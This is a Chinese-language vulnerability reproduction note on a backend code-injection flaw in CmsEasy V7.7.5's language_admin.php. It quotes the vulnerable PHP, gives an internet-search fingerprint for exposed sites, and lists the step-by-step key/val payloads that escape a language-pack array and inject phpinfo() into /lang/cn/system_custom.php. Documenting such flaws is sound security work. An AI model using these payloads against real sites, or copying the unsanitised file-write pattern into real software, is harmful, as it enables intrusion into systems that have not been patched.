# CmsEasy language_admin.php 后台命令执行漏洞

## 漏洞描述

CmsEasy 后台存在命令执行漏洞，通过文件 language_admin.php 对部分文件进行写入操作，导致任意文件写入

## 影响版本

<a-checkbox checked>CmsEasy V7.7.5_20210919</a-checkbox></br>

## 网络测绘

<a-checkbox checked>body="cmseasyedit" </a-checkbox></br>

## 环境搭建

<a-alert type="success" message="https://www.cmseasy.cn/chm/faq/show-645.html" description="" showIcon>
</a-alert>
<br/>



![img](../../../.vuepress/public/img/1632722654239-33f8ba2f-dfd8-48b9-bf8f-a93f1d2b2cba-20220313235033013.png)

## 漏洞复现

主页面

![img](../../../.vuepress/public/img/1632722813176-a2c6d9c2-e5f5-483a-8448-775a9ce41d4a-20220313235034285.png)

存在漏洞的文件为 `lib/admin/language_admin.php`

![img](../../../.vuepress/public/img/1632731716459-d529c18d-4ef7-439d-8f89-67046487db78.png)

```php
function add_action() {
        $lang_choice='system.php';
        if (isset($_GET['lang_choice'])){
            $lang_choice=$_GET['lang_choice'];
        }
        if (front::post('submit')) {
            $langid=front::get('id');
            $lang=new lang();
            $langdata = $lang->getrows('id='.$langid, 1);
            if (is_array($langdata)){
                $langurlname=$langdata[0]['langurlname'];
            }else{
                front::alert(lang_admin('language_pack').lang_admin('nonentity'));
            }
            $path=ROOT.'/lang/'.$langurlname.'/'.$lang_choice;
            $tipspath=ROOT.'/lang/'.$langurlname.'/'.$lang_choice;
            $content=file_get_contents($path);
            $tipscontent=file_get_contents($tipspath);
            $replace="'".front::$post['key']."'=>'".front::$post['val']."',";
            $tipsreplace="'".front::$post['key']."'=>'".front::$post['cnnote']."',";
            $content=str_replace(');',"\n".$replace.');',$content);
            file_put_contents($path,$content);
            $pos=strpos($tipscontent,$tipsreplace);
            if ($langurlname != 'cn'&&$pos === false) {
                $tipscontent=str_replace(');',"\n".$tipsreplace.');',$tipscontent);
                file_put_contents($tipspath,$tipscontent);
            }
            if ($_GET['site'] != 'default') {
                $ftp=new nobftp();
                $ftpconfig=config::get('website');
                $ftp->connect($ftpconfig['ftpip'],$ftpconfig['ftpuser'],$ftpconfig['ftppwd'],$ftpconfig['ftpport']);
                $ftperror=$ftp->returnerror();
                if ($ftperror) {
                    exit($ftperror);
                }
                else {
                    $ftp->nobchdir($ftpconfig['ftppath']);
                    $ftp->nobput($ftpconfig['ftppath'].'/lang/'.$langurlname.'/'.$lang_choice,$path);
                }
            }
            event::log(lang_admin('add_to').lang_admin('language_pack'),lang_admin('success'));
            //
            $shepi='<script type="text/javascript">alert("'.lang_admin('dosomething').lang_admin('complete').'");gotoinurl("'.url('language/edit/id/'.$langdata[0]['id'],true);
            $shepi=$shepi.'&lang_choice='.$lang_choice;
            $shepi=$shepi.'");</script>';
            echo $shepi;
            //exit;
            //front::refresh(url('language/edit',true));
        }
        $this->view->lang_choice=$lang_choice;
    }
```

访问这个页面

![img](../../../.vuepress/public/img/1632731775416-f1f75d5f-ced3-4d63-8ecd-f9728e3e785c.png)

其中参数有三个，分别为 `key , cnnote, val`

![img](../../../.vuepress/public/img/1632731945111-a0cb2f4a-4ab8-4f77-a026-368341754607.png)

传入参数后,查看 `lang/cn/system_custom.php` 文件中

```php
<?php
/*
 *中文语言包
 */

return

array(


'2'=>'3',);
?>
```

由于没有对传入的参数进行过滤，通过写入特殊的参数就可以逃逸出数组造成命令执行

分别传入两次参数

```php
test1  test2  test3);
```

写入后文件内容

```php
<?php
/*
 *中文语言包
 */

return

array(

'test2'=>'test3);',);
?>
```

再传入一次参数

```php
test4  ,test5, 	,phpinfo());/*
```

![img](../../../.vuepress/public/img/1632732559691-eed0b63a-9beb-44fc-ac7c-8bb456eaea14.png)

写入后文件内容

![img](../../../.vuepress/public/img/1632732579899-4659ac1d-b516-4960-93ad-c4fdf4800db5.png)

访问文件 `/lang/cn/system_custom.php`

![img](../../../.vuepress/public/img/1632732628987-af135049-37e0-4dcd-bad7-04d53985c677.png)



若有收获，就点个赞吧